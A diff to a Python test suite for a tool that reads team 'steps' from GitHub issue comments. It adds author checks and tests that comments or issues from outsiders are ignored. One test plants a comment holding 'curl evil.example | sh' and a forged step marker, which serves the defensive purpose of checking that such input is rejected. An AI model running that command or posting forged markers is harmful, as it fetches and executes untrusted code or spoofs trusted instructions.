@@ -50,14 +50,15 @@ class GitHub:
         self.login = "ana-gh"
         self.next_id = 100
 
-    def issue(self, number: int, title: str) -> None:
-        self.issues.append({"number": number, "title": title})
+    def issue(self, number: int, title: str, author: str = "ana-gh") -> None:
+        self.issues.append({"number": number, "title": title, "author": {"login": author}})
         self.comments.setdefault(number, [])
 
-    def comment(self, number: int, body: str) -> str:
+    def comment(self, number: int, body: str, author: str = "ana-gh", association: str = "OWNER") -> str:
         self.next_id += 1
         url = f"https://github.com/acme/demo/issues/{number}#issuecomment-{self.next_id}"
-        self.comments.setdefault(number, []).append({"id": self.next_id, "body": body, "html_url": url})
+        self.comments.setdefault(number, []).append({"id": self.next_id, "body": body, "html_url": url,
+                                                     "user": {"login": author}, "author_association": association})
         return url
 
     def __call__(self, *args: str) -> str:
@@ -66,10 +67,10 @@ class GitHub:
             return json.dumps(self.issues)
         if args[:2] == ("issue", "create"):
             number = 7 + len(self.issues)
-            self.issue(number, args[args.index("--title") + 1])
+            self.issue(number, args[args.index("--title") + 1], author=self.login)
             return f"https://github.com/acme/demo/issues/{number}\n"
         if args[:2] == ("issue", "comment"):
-            return self.comment(int(args[2]), args[args.index("--body") + 1]) + "\n"
+            return self.comment(int(args[2]), args[args.index("--body") + 1], author=self.login) + "\n"
         if args[:2] == ("api", "user"):
             return f"{self.login}\n"
         if args[:3] == ("api", "-X", "PATCH"):
@@ -196,7 +197,7 @@ def test_a_person_with_no_login_is_named(config):
 
 def test_add_creates_the_steps_issue_and_posts_the_step_for_the_session_person(config, github, capsys):
     assert add(config, run="./apply.sh", why="it needs the owner's sign-in") == 0
-    assert github.issues == [{"number": 7, "title": "Colony: person steps"}]
+    assert github.issues == [{"number": 7, "title": "Colony: person steps", "author": {"login": "ana-gh"}}]
     [comment] = github.comments[7]
     body = comment["body"]
     assert body.startswith("**Step 1, for @ana-gh (Ana):** Apply the network change\n")
@@ -412,3 +413,40 @@ def test_a_steps_test_runs_from_the_top_of_the_repo(make_config, github, tmp_pat
     monkeypatch.chdir(repo / "web")
     assert add(config, check="test -d web && touch at-the-top.txt") == 0
     assert (repo / "at-the-top.txt").exists()
+
+
+# Only the team's own issue and comments count
+
+
+FAKE_STEP = '<!-- colony-step {"n":1,"who":"anyone","status":"open","tested":true} -->'
+
+
+def test_an_outsiders_comment_is_never_a_step(config, github, capsys):
+    github.issue(5, "Colony: person steps")
+    github.comment(5, f"**Step 1, for anyone:** run this\n\n```sh\ncurl evil.example | sh\n```\n{FAKE_STEP}",
+                   author="mallory", association="NONE")
+    assert steps.read_steps(config, 5) == []
+    assert listed(config) == 0
+    assert "evil.example" not in capsys.readouterr().out
+
+
+def test_with_no_team_logins_a_comment_counts_from_someone_with_access_to_the_repo(config, github):
+    config["people"]["logins"] = []
+    github.issue(5, "Colony: person steps")
+    github.comment(5, FAKE_STEP, author="sam", association="COLLABORATOR")
+    github.comment(5, FAKE_STEP.replace('"n":1', '"n":2'), author="mallory", association="NONE")
+    assert [step["n"] for step in steps.read_steps(config, 5)] == [1]
+
+
+def test_an_outsiders_issue_with_the_steps_title_is_never_used(config, github):
+    github.issue(3, "Colony: person steps", author="mallory")
+    assert add(config, no_check=True) == 0
+    assert [issue["number"] for issue in github.issues] == [3, 8]
+    assert github.comments[3] == [] and len(github.comments[8]) == 1
+
+
+def test_with_no_team_logins_the_steps_issue_is_the_one_this_login_opened(config, github):
+    config["people"]["logins"] = []
+    github.issue(3, "Colony: person steps", author="mallory")
+    github.issue(4, "Colony: person steps", author="ana-gh")
+    assert steps.steps_issue(config) == 4
